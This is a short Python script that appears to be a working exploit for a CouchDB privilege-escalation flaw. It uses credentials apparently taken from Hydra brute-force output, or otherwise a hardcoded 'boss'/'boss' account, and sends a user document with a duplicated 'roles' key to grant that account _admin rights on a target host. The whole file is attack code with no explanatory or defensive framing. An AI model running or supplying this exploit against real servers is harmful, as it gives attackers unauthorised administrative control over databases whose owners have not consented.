import requests
import sys
import json
import os

host = sys.argv[1]

if os.path.exists("/app/hydra.json"):
    result = json.load(open("/app/hydra.json"))['results'][0]
    user = result['login']
    url = "http://%s:%s@%s" % (user, result['password'], host)

    user_doc_url = url + "/_users/org.couchdb.user:" + user

    # first pull _rev
    res = requests.get(user_doc_url)
    rev = res.json()['_rev']

    exploit = ('{"_rev": "%s", "type": "user", "name": "%s", "password": "%s", "roles": ["_admin"], "roles": %s }' % (
        rev, user, result['password'], res.json()['roles'])).replace("'", '"')

    requests.put(user_doc_url, data=exploit)
    print("Made user %s to an admin" % user)
else:
    user = "boss"
    password = "boss"

    exploit = '{"type": "user", "name": "%s", "password": "%s", "roles": ["_admin"], "roles": [] }' % (user, password)

    y = requests.put("http://%s/_users/org.couchdb.user:%s" % (host, user), data=exploit)
    print(y.json())
    print("Created new admin user %s" % user)
